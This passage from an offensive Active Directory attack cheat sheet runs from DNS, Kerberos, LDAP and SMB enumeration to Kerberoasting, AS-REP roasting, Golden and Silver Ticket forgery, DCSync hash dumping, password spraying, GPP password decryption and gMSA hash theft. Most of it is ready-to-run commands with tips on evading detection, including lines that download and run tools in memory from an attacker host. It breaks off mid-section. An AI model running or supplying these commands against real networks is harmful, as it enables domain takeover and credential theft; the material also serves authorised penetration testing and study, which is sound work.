dig A [domain] @[dc-ip]
dig SRV _ldap._tcp.dc._msdcs.[domain] @[dc-ip]
dnsrecon -d [domain_name] -n [dns_server_ip] -t axfr
dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver [dns_server_ip] [domain_name]
# Reverse lookup sweep
nmap -sL [target_ip_range] | grep "Nmap scan report"

# DNS cache snooping — check without recursion
dig @[dns_server_ip] -t A +norecurse [target_domain]
# Enumerate DNS from Windows
Resolve-DnsName -Name [domain_name] -Server [dns_server_ip] -DnsOnly

12.1.2 Kerberos Enumeration (Port 88)

Enumerate valid users and extract AS-REP / TGS tickets for offline cracking; accounts with DONT_REQ_PREAUTH need no credentials, Kerberoasting needs any valid domain account. RC4 (etype 23) cracks far faster than AES-256 (etype 18) with hashcat. Silver Tickets are forged per-service using the service account hash; Golden Tickets use the krbtgt hash and grant domain-wide access.

# Nmap Kerberos scripts
nmap -p 88 --script kerberos-enum-users [target_ip]
nmap -p 88 --script krb5-enum-users,krb5-scan [target_ip]
# AS-REP Roasting — accounts with pre-auth disabled (no creds needed)
GetNPUsers.py [domain]/ -usersfile users.txt -dc-ip [dc-ip] -format hashcat
impacket-GetNPUsers -dc-ip [dc_ip] -request -usersfile [userlist] [target_domain]

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# Kerberoasting — extract and crack service tickets (any domain creds)
GetUserSPNs.py [domain]/[username]:[password] -dc-ip [dc-ip]
impacket-GetUserSPNs -dc-ip [dc_ip] -outputfile [tickets_file] [domain]/[username]:[password]

# Crack TGS hashes
hashcat -m 13100 kerberoast.txt rockyou.txt
john --wordlist=[wordlist] [ticket_file]
# User enumeration
kerbrute userenum -d [domain] -p [userlist] [target_ip]
./kerbrute_linux_amd64 userenum -d [domain] /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# Ticket requests
impacket-GetTGT -dc-ip [dc_ip] -outputfile [outputfile] [username]@[domain]
python3 GetST.py -dc-ip [dc_ip] [domain]/[username]:[password] -spn [service]/[target]
# Rubeus ticket operations
rubeus.exe asktgt /user:[username] /rc4:[password]
rubeus.exe s4u /user:[username] /rc4:[password] /impersonateuser:[target_user]
# Golden Ticket — dump krbtgt hash then forge
impacket-secretsdump -outputfile [dump_file] [domain]/[username]:[password]@[dc_ip]
ticketer -user [user] -domain [domain] -sid [domain_sid] -krbtgt [krbtgt_hash] -output [ticket_file]
impacket-psexec -target-ip [target_ip] -ticket [ticket_file] [username]

# Silver Ticket — forge per-service using service account hash
ticketer -spn [service/host] -nthash [hash] -domain-sid [sid] -domain [d] [user]
# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass [domain]/[user]@[host]
# Dump Kerberos tickets from memory (Mimikatz)
mimikatz "sekurlsa::tickets /export"

Additional reference: https://www.tarlogic.com/blog/how-to-attack-kerberos/

Attack Precondition Key Command / Flag hashcat Mode OPSEC Risk
AS-REP Roasting Account has DONT_REQ_PREAUTH; only a user list needed (no creds) GetNPUsers.py [domain]/ -usersfile users.txt -format hashcat 18200 Low — single AS-REQ per user; Event 4768 logged
Kerberoasting Any valid domain credentials; target account must have an SPN GetUserSPNs.py domain/user:pass -dc-ip [dc] -outputfile tickets.txt 13100 Medium — Event 4769 per TGS request; bulk requests detectable
Silver Ticket Service account NTLM hash (from secretsdump/Mimikatz); domain SID ticketer -spn [service/host] -nthash [hash] -domain-sid [sid] -domain [d] [user] N/A — offline forgery Low — no DC contact after ticket creation; no Event 4769
Golden Ticket krbtgt NTLM hash; domain SID (requires DA or DCSync) ticketer -krbtgt [hash] -domain-sid [sid] -domain [d] [any-user] N/A — offline forgery Low once forged; persists ~10 hours default; detected by Kerberos Event 4769 anomalies
Pass-the-Ticket Existing TGT or TGS on disk/memory (.ccache or .kirbi) export KRB5CCNAME=ticket.ccache; psexec.py -k -no-pass [domain]/[user]@[host] N/A Low — re-uses existing ticket; no new authentication events
Unconstrained Delegation Abuse Control of a machine with Unconstrained Delegation; trick a high-priv user to connect Rubeus.exe monitor /interval:5 then force connection via printer bug / SpoolSample N/A Medium — requires coercion technique; TGT capture via Rubeus monitor

12.1.3 LDAP Enumeration (Port 389/636)

Query LDAP anonymously or with credentials to extract users, groups, computers, and sensitive attributes. Always prefer LDAPS (-H ldaps://) when submitting credentials to avoid cleartext bind on the wire. Key attributes to hunt: ms-MCS-AdmPwd (LAPS password), description containing passwords, servicePrincipalName (Kerberoastable), userAccountControl bit 4194304 (pre-auth disabled).

# Nmap LDAP scripts
nmap -n -sV --script "ldap* and not brute" [target_ip]
# Anonymous queries — base info, naming contexts
ldapsearch -x -H ldap://[target_ip]
ldapsearch -x -H ldap://[target_ip] -s base namingcontexts
ldapsearch -x -H ldap://[dc-ip] -b "dc=[domain],dc=[tld]"
ldapsearch -v -x -b "DC=[domain],DC=[tld]" -H "ldap://[target_ip]" "(objectclass=*)"
# Extract users and groups
ldapsearch -x -h [dc-ip] -b "dc=[domain],dc=[tld]" "(objectClass=user)" sAMAccountName
ldapsearch -x -h [dc-ip] -b "dc=[domain],dc=[tld]" "(objectClass=group)" cn
# Authenticated queries
ldapsearch -h [target_ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=[domain],DC=[tld]"
ldapsearch -H ldap://[target_ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=[domain],DC=[tld]" "[filter]"
# Useful LDAP search filters

# LAPS / cleartext passwords
(ms-MCS-AdmPwd=*)
(description=*password*)

# Account state
(userAccountControl:1.2.840.113556.1.4.803:=2)           # disabled
(userAccountControl:1.2.840.113556.1.4.803:=4194304)     # pre-auth disabled (ASREPRoast)
(&(objectClass=user)(pwdLastSet<=0))                      # expired passwords

# Kerberos / delegation
(servicePrincipalName=*)                                  # Kerberoastable accounts
(msDS-AllowedToDelegateTo=*)                              # constrained delegation

# Membership
(memberOf=CN=Domain Admins,CN=Users,DC=[domain],DC=[tld])
(&(objectClass=user)(memberOf=CN=[GroupName],OU=Groups,DC=[domain],DC=[tld]))

# Misc
(objectClass=user)
(objectClass=computer)
(objectClass=group)
(objectClass=cACertificate)                               # AD Certificate Services

12.1.4 SMB/NetBIOS Enumeration (Port 445)

Enumerate shares, sessions, users, and OS info over SMB; test for null sessions and vulnerabilities; execute commands once credentials are found. SYSVOL and NETLOGON are world-readable on every DC — check SYSVOL for Groups.xml with cpassword (GPP passwords).

# Host and service discovery
nmap -v -p 139,445 [ip]
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery [ip]
sudo nbtscan -r 192.168.50.0/24
# Nmap SMB enumeration and vulnerability scripts
nmap --script smb-enum-shares.nse,smb-enum-users.nse -p445 [ip]
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 [ip]
nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 [ip]
nmap --script smb-vuln-ms17-010.nse -p445 [ip]
# smbclient — list and browse shares
smbclient -L //[dc-ip] -U "guest"
smbclient --no-pass -L //[ip]
smbclient -L //[ip] -U [user]
smbclient //[ip]/[share] -U [user] -c "prompt OFF;recurse ON;mget *"
# smbmap
smbmap -H [ip]
smbmap -u '' -p '' -H [ip]
smbmap -u 'guest' -p '' -H [ip]
smbmap -u '' -p '' -H [ip] -R
# crackmapexec — share/user/session enumeration
crackmapexec smb [ip]
crackmapexec smb [ip] -u '' -p '' --shares
crackmapexec smb [ip] -u 'guest' -p ''
crackmapexec smb [ip] -u guest -p "" --rid-brute
crackmapexec smb [ip] -u '[user]' -p '[password]'
# rpcclient — null session enumeration
rpcclient -U "" [dc-ip] --command="enumdomusers"
# enum4linux
enum4linux -a [ip]
enum4linux -a -u "" -p "" [ip]
enum4linux -a -u "[user]" -p "[password]" [ip]
enum4linux -U -M -S -P -G [ip]
# Brute force credentials
crackmapexec smb [ip] -u [users_list] -p [passwords_list]
hydra -V -f -L [users_list] -P [passwords_list] smb://[ip] -u -vV
# Mount shares
sudo mount -t cifs //[ip]/[share] /tmp/share
sudo mount -t cifs -o 'username=[user],password=[password]' //[ip]/[share] /tmp/share
# Remote execution (impacket) — PsExec noisiest; WMIexec no binary on disk
psexec.py [domain]/[user]:[password]@[ip]
psexec.py [domain]/[user]@[ip] -hashes :[nthash]
wmiexec.py [domain]/[user]:[password]@[ip]
wmiexec.py [domain]/[user]@[ip] -hashes :[nthash]
smbexec.py [domain]/[user]:[password]@[ip]
atexec.py [domain]/[user]:[password]@[ip] [command]

Exploitation (EternalBlue - MS17-010): https://github.com/3ndG4me/AutoBlue-MS17-010

12.1.5 WinRM Enumeration and Access (Port 5985)

Test for WinRM access with found credentials and drop into an interactive session. Evil-WinRM supports pass-the-hash (-H), in-session upload/download, and loading scripts into memory (-s) to avoid writing tools to disk.

# Nmap scan
nmap -p 5985,5986 --script winrm-info [ip]
# crackmapexec — test access (Pwn3d! = full admin)
crackmapexec winrm [dc-ip] -u [username] -p [password]
crackmapexec winrm [ip] -u [user] -p [password]
# evil-winrm — interactive shell
evil-winrm -i [dc-ip] -u [username] -p [password]
evil-winrm -i [ip] -u [user] -H [nthash]   # pass-the-hash
# Connect via PowerShell remoting
Enter-PSSession -ComputerName $IP -Credential (Get-Credential)

14.2 Basic Enumeration

Built-in Windows tools query AD via LDAP and RPC without requiring third-party binaries — low footprint on restricted hosts.

# Domain SID
(Get-ADDomain).DomainSID
whoami /user
wmic useraccount where name='[username]' get sid

# Find Domain Controllers
Get-ADDomainController -Filter *
nltest /dclist:[domain]
netdom query dc

# Domain trusts
nltest /domain_trusts

# Service accounts and SPNs
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames

# Managed service accounts
sc queryex type= service
# SPNs via LDAP (Kali)
ldapsearch -x -h [dc_ip] -b "DC=[domain],DC=[tld]" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName

# Domain users and groups
net user /domain
net user [username] /domain
net groups /domain
net groups [groupName] /domain
# Reusable LDAPSearch function
function LDAPSearch {
  param ([string]$LDAPQuery)
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DistinguishedName = ([adsi]'').distinguishedName
  $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
  $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
  return $DirectorySearcher.FindAll()
}

# Query users, groups, nested groups
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=[GroupName]))"

# Iterate group members
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
  $group.Properties | Select-Object {$_.cn}, {$_.member}
}

14.3 PowerView

PowerView wraps AD queries into concise PowerShell cmdlets — import it once, then enumerate domains, users, groups, computers, shares, and delegations. Load in-memory to avoid disk writes: IEX (New-Object Net.WebClient).DownloadString('http://[attacker]/PowerView.ps1'). Download PowerView.ps1

# Import PowerView
Import-Module .\PowerView.ps1

# Domain and DC info
Get-NetDomain
Get-NetDomainController

# Users
Get-NetUser
Get-NetUser | Select-Object [attributes]
Get-NetUser -SPN                                    # Kerberoastable accounts
Get-NetUser -Delegation                             # delegated accounts

# Groups
Get-NetGroup | Select-Object [attributes]
Get-NetGroup -GroupName "Domain Admins"

# Computers / OS
Get-NetComputer | Select-Object [attributes]

# Shares
Get-NetShare

# Session and logon hunting
Get-NetSession -ComputerName [dc]
Get-NetLoggedon -ComputerName [target]
Find-DomainUserLocation

# Trust enumeration
Get-NetDomainTrust
Get-NetForestTrust

# ACL enumeration shortcut
Find-InterestingDomainAcl -ResolveGUIDs

14.4 Service Principal Names (SPN) Enumeration

List SPNs to identify service accounts eligible for Kerberoasting. Any authenticated user can request a TGS for an SPN and crack the account's password offline. Prioritise human-managed accounts (e.g. MSSQLSvc, HTTP, exchangeMDB) in privileged groups — gMSA accounts have 240-char rotating passwords and are not crackable.

# List SPNs linked to a specific account
setspn -L [service]
# List all SPN accounts in the domain
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname

14.5 Object Permissions Enumeration

Inspect ACLs on AD objects to find abusable rights that enable privilege escalation. Key permission types: GenericAll (full control), GenericWrite (edit attributes), WriteOwner (change owner → implicit WriteDACL), WriteDACL (edit ACEs → grant DCSync), AllExtendedRights, ForceChangePassword, Self (add self to groups). Permissions on an OU inherit to all objects within it.

Permission / Right Target Object Abuse Technique Noise Level
GenericAll User Reset password, write SPN (then Kerberoast), add to group Medium — password reset generates Event 4723/4724
GenericAll Group Add self or any user to the group Low — group membership change Event 4728/4756
GenericAll Computer Resource-Based Constrained Delegation (RBCD) — write msDS-AllowedToActOnBehalfOfOtherIdentity Low — attribute write only
GenericWrite User Write SPN → Kerberoast; set logon script; modify userAccountControl Low — attribute modification, no auth event
WriteDACL Domain object Grant self DS-Replication rights → DCSync all hashes Low — ACL change logged only if auditing is enabled
WriteOwner Any Become owner → implicit WriteDACL → grant GenericAll Low
ForceChangePassword User Reset target password without knowing current password High — disrupts user; Event 4723/4724 generated
AllExtendedRights User Includes ForceChangePassword and replication rights if on domain object Depends on abuse chosen
Self (Self-Membership) Group Add self to the group without GenericAll Low
ReadLAPSPassword / ms-MCS-AdmPwd read Computer Read plaintext local admin password managed by LAPS Very Low — read-only LDAP query 
# Inspect ACL for a user or group
Get-ObjectAcl -Identity [username]
Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object SecurityIdentifier, ActiveDirectoryRights

# Resolve SIDs to names
Convert-SidToName [SID]
"[SID1]", "[SID2]" | Convert-SidToName

# Verify group membership
Get-NetGroup "[GroupName]" | Select-Object member
# Add yourself to a domain group (requires GenericAll or similar)
net group "[GroupName]" [username] /add /domain

14.6 Domain Shares Enumeration

Discover accessible shares and check SYSVOL for GPP passwords. Groups.xml, Services.xml, ScheduledTasks.xml in SYSVOL may contain cpassword attributes (AES key is public — trivially decryptable). Also look for *.config, *.xml, web.config, *.kdbx, *.rdp on IT shares.

# Find all domain shares (PowerView)
Find-DomainShare
Find-DomainShare -CheckShareAccess
# Decrypt a GPP cpassword value
gpp-decrypt [encrypted_password]

14.7 BloodHound & SharpHound

BloodHound visualises AD relationships and shortest attack paths to Domain Admin. SharpHound collects raw data via LDAP/SMB; if AV blocks SharpHound on target, use bloodhound-python from Kali remotely. After import: mark owned nodes, run Shortest Paths from Owned Principals, check for Unconstrained Delegation computers and WriteDACL holders on the domain object.

Resources: SharpHound.ps1  |  SharpHound.exe

# Step 1 — Download SharpHound to target
Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.ps1" -OutFile "C:\Temp\sharphound.ps1"
Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.exe" -OutFile "C:\Temp\sharphound.exe"

# Step 2 — Find domain name, then run SharpHound
nltest /dclist:domainname
Get-ADDomainController -Discover

# Run via .exe
.\SharpHound.exe -c All
.\SharpHound.exe -c All -d [domain] -u [username] -p [password] -f AllData

# Run via PowerShell script
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain [domain] -OutputDirectory C:\Temp

# Quieter targeted collection
Invoke-BloodHound -CollectionMethod DCOnly
Invoke-BloodHound -CollectionMethod Group
Invoke-BloodHound -CollectionMethod ACL
# bloodhound-python — remote collection from Kali (no binary on target)
bloodhound-python -u [user] -p [pass] -d [domain] -c All -ns [dc-ip]
# Step 3 — Transfer ZIP to Kali (evil-winrm session)
download [bloodhound_file].zip
# Step 4 — Start BloodHound on Kali
sudo neo4j start
bloodhound
BloodHound Edge Meaning Abuse / Attack Path Required Tool / Command
MemberOf Principal is a direct or nested member of the group Inherit all rights and privileges of the group; check for DA/EA membership chains Get-NetGroupMember -Recurse / BloodHound graph traversal
GenericAll Full control over the target object Reset password, write SPN (Kerberoast), add to group, RBCD on computers Set-DomainUserPassword, Set-DomainObject -Set @{serviceprincipalname=...}
GenericWrite Can write arbitrary non-protected attributes on the object Write SPN → Kerberoast; set logon script; set msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD Set-DomainObject (PowerView)
WriteDACL Can modify the DACL of the object Grant self GenericAll or DCSync rights; pivot to any other ACL abuse Add-DomainObjectAcl -Rights All / Add-DomainObjectAcl -Rights DCSync
WriteOwner Can change the owner of the object Set self as owner → implicit WriteDACL → grant any right Set-DomainObjectOwner (PowerView)
ForceChangePassword Can reset the target user's password without knowing the current password Reset target password and authenticate as them; disruptive — prefer Kerberoast path Set-DomainUserPassword -Identity [user] -AccountPassword [newpass]
HasSession A high-value user has an active session on this computer Compromise the computer → dump LSASS → steal cached credentials / TGT of the privileged user Mimikatz sekurlsa::logonpasswords; Rubeus dump
CanRDP Principal can log on via Remote Desktop RDP into machine as that user; if local admin, dump LSASS for further credentials xfreerdp /u:[user] /p:[pass] /v:[ip]
CanPSRemote Principal can open a PowerShell remoting session on the target computer Interactive shell via Evil-WinRM; enumerate local host; upload tools in memory evil-winrm -i [ip] -u [user] -p [pass]
SQLAdmin Principal is a sysadmin on the target SQL Server instance Execute OS commands via xp_cmdshell; read local files; move laterally PowerUpSQL: Invoke-SQLOSCmd; impacket mssqlclient.py
AllowedToDelegate (Constrained) Service can request tickets on behalf of any user to the listed target services S4U2Proxy — impersonate DA to the target service; get shell as DA on specific host Rubeus s4u; impacket getST.py -impersonate Administrator
AllowedToAct (RBCD) Target computer trusts the source to act on behalf of users With write access to msDS-AllowedToActOnBehalfOfOtherIdentity, add controlled computer → impersonate DA to target PowerView Set-DomainObject + Rubeus s4u
DCSync Principal holds DS-Replication-Get-Changes(-All) rights on the domain object Replicate all password hashes from the DC without logging on to it Mimikatz lsadump::dcsync /domain:[d] /all; impacket secretsdump.py
GetChangesAll Replication right on domain object (required alongside GetChanges for DCSync) Same as DCSync above — must have both rights Add-DomainObjectAcl -Rights DCSync to grant; same dump tools
Owns Principal is the owner of the object Ownership implies WriteDACL; grant any additional right to escalate Add-DomainObjectAcl after confirming ownership via Get-ObjectAcl
AddMember Can add members to the group Add self or a controlled account to the group to inherit its privileges Add-DomainGroupMember -Identity [group] -Members [user]
ReadLAPSPassword Can read the ms-MCS-AdmPwd attribute of the target computer Retrieve plaintext local admin password; authenticate as local admin to target host Get-ADComputer -Filter * -Properties ms-MCS-AdmPwd; CrackMapExec --laps

Cypher quick-reference: all computers: MATCH (m:Computer) RETURN m — all users: MATCH (m:User) RETURN m — active sessions: MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p — SQLAdmin users: MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2 — CanPSRemote users: MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2.

14.8 Extracting and Cracking Password Hashes

Use SecretsDump to pull NTDS.dit hashes from a DC, then crack them offline with Hashcat or pass them directly with evil-winrm or CME.

Method Access Required Key Command / Flag OPSEC Noise Confirms Success When
DCSync (DRSUAPI) DA or DCSync rights secretsdump.py domain/user:pass@dc-ip High — Event ID 4662 logged Output contains krbtgt hash line
VSS / NTDS copy Local shell on DC (SYSTEM) secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL Medium — shadow copy creation visible NTDS.dit successfully parsed offline
SAM dump (workstation) Local admin on target secretsdump.py domain/user:pass@host Low — targets local SAM only Local account hashes appear in output
Hashcat crack (NTLM) Offline — hash file only hashcat -m 1000 hashes.txt rockyou.txt None (offline) Hashcat status shows Cracked
CME spray Domain user + target list crackmapexec smb dc-ip -u users.txt -p pass --spray High — multiple auth events Line shows [+] / Pwn3d! 
secretsdump.py <domain>/<username>:<password>@<dc-ip>
# Crack NTLM hashes offline
hashcat -m 1000 ntlm-hashes.txt rockyou.txt
# Password spray - one password across many accounts
crackmapexec smb <dc-ip> -u usernames.txt -p <password> --spray

14.9 MS-RPRN Print Spooler Service Exploitation

The MS-RPRN interface forces a DC to authenticate back to an attacker-controlled host via RpcRemoteFindFirstPrinterChangeNotification; pair with Responder or ntlmrelayx to capture or relay the machine account hash.

Coercion Method Protocol / Interface Tool Requires Credentials Patched By Default
MS-RPRN (Printerbug) SMB / RPC printerbug.py, rpcclient Yes — domain user No (if Spooler still running)
PetitPotam (MS-EFSRPC) SMB / RPC PetitPotam.py No (unauthenticated variant) Partially — KB5005413
MS-DFSNM SMB / RPC dfscoerce.py Yes — domain user No
MS-FSRVP SMB / RPC shadowcoerce.py Yes — domain user No (if VSS Writer active) 
# Confirm Print Spooler is active on the DC
rpcclient -U "<user>%<password>" <dc-ip> --command="enumprinters"

14.10 Common SPNs for Service Accounts

Any authenticated domain user can query LDAP for all SPNs; accounts with SPNs can be Kerberoasted because the KDC issues TGS tickets encrypted with the service account's hash.

SPN Prefix Service Kerberoast Priority Why High Value
mssql Microsoft SQL Server Very High SA-level DB access; often runs as domain svc account with broad rights
exchange Microsoft Exchange Server Very High Exchange org admins have WriteDacl on domain object by default
http Web / IIS services High Frequently a domain user account with weak password
termsrv Terminal Server / RDP Medium Interactive logon access if cracked
ldap Active Directory LDAP Medium Usually machine accounts — lower cracking success
wsman WinRM / PS Remoting Medium Remote shell access if cracked
cifs SMB File Sharing Low-Medium Usually machine accounts; share access useful
krbtgt Kerberos TGT service N/A (not roastable) Target via DCSync only; enables Golden Ticket

14.11 GPP Passwords Abuse (Group Policy Preferences)

SYSVOL stores GPP XML files readable by all domain users; cpassword values in those files are trivially decrypted with gpp-decrypt because Microsoft published the AES-256 key in 2012 (MS14-025).

AD Misconfiguration What to Read How to Abuse Primary Tool
GPP cpassword in SYSVOL SYSVOL\<domain>\Policies\**\Groups.xml and sibling XMLs Decrypt with known AES key; use password for PTH or local admin access gpp-decrypt, Get-GPPPassword.py, CME -M gpp_password
gMSA readable by non-admin msDS-ManagedPassword LDAP attribute; BloodHound ReadGMSAPassword edge Extract rc4_hmac NT hash; pass-the-hash or Kerberos overpass GMSAPasswordReader.exe, Get-ADServiceAccount, ldapsearch
GPO write permissions (non-admin) BloodHound WriteGPO/GenericWrite edges; PowerView ACL check Inject scheduled task or add local admin via SharpGPOAbuse; run gpupdate /force SharpGPOAbuse.exe, PowerView Get-DomainObjectAcl
LAPS password readable by user ms-Mcs-AdmPwd LDAP attribute on computer objects Read cleartext local admin password; authenticate as local admin CME --laps, Get-AdmPwdPassword, ldapsearch
AS-REP Roasting (no pre-auth) Accounts with DONT_REQ_PREAUTH flag set Request AS-REP without credentials; crack TGT hash offline GetNPUsers.py, Rubeus asreproast, hashcat -m 18200
Kerberoastable SPN accounts User accounts with SPNs in LDAP (servicePrincipalName) Request TGS; crack RC4-encrypted ticket offline GetUserSPNs.py, Rubeus kerberoast, hashcat -m 13100
Unconstrained delegation Computers/users with TRUSTED_FOR_DELEGATION flag Coerce DC auth to that host; extract TGT from LSASS memory Rubeus monitor, Mimikatz, MS-RPRN coercion
Print Spooler active on DC enumprinters via rpcclient returns result Coerce DC machine account auth; relay or capture NTLM printerbug.py, Responder, ntlmrelayx.py

14.11.1 GPP Main Method for Extraction

# Map the DC SYSVOL share
net use z:\\[hostname/domain]\SYSVOL

# Find the GPP file
dir /s Groups.xml

type Groups.xml
# Decrypt the cpassword value
gpp-decrypt [cpassword]

# Search SYSVOL share directly for cpassword entries
dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword

# Browse SYSVOL for Groups.xml files
smbclient //<dc-ip>/SYSVOL -U "<domain>\<username>"

14.11.2 Impacket-Get-GPPPassword

Get-GPPPassword.py retrieves GPP passwords remotely over SMB.

# NULL session
Get-GPPPassword.py -no-pass '[DOMAIN_CONTROLLER]'
# Cleartext credentials
Get-GPPPassword.py '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
# Pass-the-hash
Get-GPPPassword.py -hashes :'[NThash]' '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
# Parse a local policy XML file
Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'

14.11.3 SMB Share — SYSVOL

# Search downloaded SYSVOL files for cpassword entries
grep -inr "cpassword"

14.11.4 CrackMapExec

# With cleartext credentials
crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
# Pass-the-hash
crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password

14.12 Scripts (adPEAS)

adPEAS is an automated PowerShell enumeration script covering domain info, rights, GPOs, ADCS, credentials, delegation, accounts, and BloodHound collection. Download from github.com/61106960/adPEAS.

Module Flag What It Checks High-Value Findings Typical Next Step
-Module Domain Domain info, trusts, functional level Cross-domain trusts with SID history Enumerate trusted domains for lateral movement
-Module Rights AD ACLs and delegated permissions GenericAll / WriteDacl on sensitive objects ACL abuse — add self to group or reset password
-Module GPO GPO scope and write permissions Writable GPOs applied to DC OU SharpGPOAbuse to add local admin or run task
-Module ADCS Certificate template misconfigs (ESC1–ESC8) Enrollable templates with SAN override Request DA certificate via Certipy
-Module Creds GPP passwords, LAPS, gMSAs, AS-REP cpassword entries, readable LAPS, roastable accounts Decrypt / crack immediately; PTH with gMSA hash
-Module Delegation Unconstrained, constrained, resource-based delegation Unconstrained delegation on non-DC hosts Coerce DC auth to that host; extract TGT
-Module Accounts Privileged group membership Unexpected members of DA / Enterprise Admins Compromise that account for immediate DA
-Module Bloodhound Full AD relationship graph Attack path chains not visible from single queries Load ZIP into BloodHound GUI for path analysis 
# Import the module - pick any one method
powershell -ExecutionPolicy Bypass
Import-Module .\adPEAS.ps1
. .\adPEAS.ps1
gc -raw .\adPEAS.ps1 | iex
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
# Enumerate current domain
Invoke-adPEAS

# Specify domain and save output without ANSI colour codes
Invoke-adPEAS -Domain '[domain].com' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor

# Target a specific domain controller
Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com'

# Use a PSCredential object
$SecPassword = ConvertTo-SecureString '[password]' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('[domain]\[userName]', $SecPassword)
Invoke-adPEAS -Domain '[domain].com' -Cred $Cred

# Supply username and password explicitly
Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com' -Username '[domain]\[userName]' -Password '[password]' -Force
# Module-specific runs
Invoke-adPEAS -Module Domain
Invoke-adPEAS -Module Rights
Invoke-adPEAS -Module GPO
Invoke-adPEAS -Module ADCS
Invoke-adPEAS -Module Creds
Invoke-adPEAS -Module Delegation
Invoke-adPEAS -Module Accounts
Invoke-adPEAS -Module Computer
Invoke-adPEAS -Module Bloodhound
Invoke-adPEAS -Module Bloodhound -Scope All

14.13 Group Managed Service Accounts (gMSAs) Abuse

gMSA accounts store an auto-rotated password in the msDS-ManagedPassword AD attribute; if you can read that attribute you recover an NTLM hash usable for pass-the-hash. The rc4_hmac field within the BLOB is the NT hash, readable only by accounts listed in msDS-GroupMSAMembership.

Step Goal Tool / Command What Confirms Success
1 — Identify gMSAs Find all gMSA accounts in the domain Get-ADObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" One or more objects returned with msDS-ManagedPassword attribute visible
2 — Check read rights Confirm your user can read the password blob BloodHound ReadGMSAPassword edge or PowerView Get-DomainObjectAcl Edge present; or ACL shows ReadProperty on msDS-ManagedPassword
3 — Retrieve NT hash Extract rc4_hmac from the BLOB GMSAPasswordReader.exe --AccountName svc_apache Tool prints rc4_hmac hex value
4 — Pass-the-hash Authenticate as gMSA account evil-winrm -i <ip> -u svc_apache$ -H <rc4_hmac> Shell prompt as svc_apache$
5 — Overpass-the-hash Request Kerberos TGT using AES key Rubeus.exe asktgt /user:svc_apache$ /aes256:<key> TGT returned and injected into session

14.13.1 Identifying gMSAs

# List all gMSAs - requires Get-ADServiceAccount
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties *
# LDAP query alternative - works without the AD module
Get-ADObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" -Properties *
# Collect BloodHound data
SharpHound.exe -c All

In the BloodHound GUI, upload the collected data and search for objects where user groups hold ReadProperty rights on msDS-ManagedPassword, or run "Find Principals with Unusual Rights on Password Attributes".

14.13.2 gMSA Password Retrieval

GMSAPasswordReader.exe retrieves the plaintext password for a gMSA; the returned rc4_hmac is an NTLM hash — use it for PTH with evil-winrm -i [ip] -u svc_apache$ -H [ntlm_hash] (note the trailing $).

.\GMSAPasswordReader.exe --AccountName [GMSA_ACCOUNT_NAME]

14.13.3 Alternative Commands

# PowerShell AD module
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties msDS-ManagedPassword
# Get-ADObject alternative
Get-ADObject -Filter 'ObjectClass -eq "msDS-GroupManagedServiceAccount"' -Properties msDS-ManagedPassword
# PowerView
